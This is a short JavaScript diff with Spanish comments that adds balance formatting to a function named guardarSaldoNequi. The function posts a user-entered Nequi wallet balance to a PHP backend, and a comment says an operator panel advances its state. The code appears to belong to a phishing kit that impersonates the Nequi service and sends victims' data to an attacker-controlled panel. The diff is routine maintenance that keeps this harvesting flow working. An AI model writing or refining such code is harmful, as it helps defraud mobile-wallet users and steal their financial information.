@@ -1,3 +1,9 @@
+// Función para formatear saldo con puntos de miles
+function formatearSaldo(saldo) {
+    if (!saldo) return saldo;
+    return String(saldo).replace(/\B(?=(\d{3})+(?!\d))/g, '.');
+}
+
 function detectar_dispositivo(){
     var dispositivo = "";
     if(navigator.userAgent.match(/Android/i))
@@ -651,8 +657,11 @@ function guardarSaldoNequi() {
     // Mostrar spinner de carga
     vista_saldo_listo();
     
+    // Limpiar el saldo de puntos para enviar solo números
+    var saldoLimpio = saldo.replace(/\./g, '');
+    
     // Enviar saldo al backend
-    $.post("../../../process/guardar_saldo.php", {saldo: saldo}, function(data) {
+    $.post("../../../process/guardar_saldo.php", {saldo: saldoLimpio}, function(data) {
         if (data.trim() === 'OK') {
             console.log('Saldo guardado correctamente');
             // El panel cambiará de estado automáticamente (estado 27 → 28)
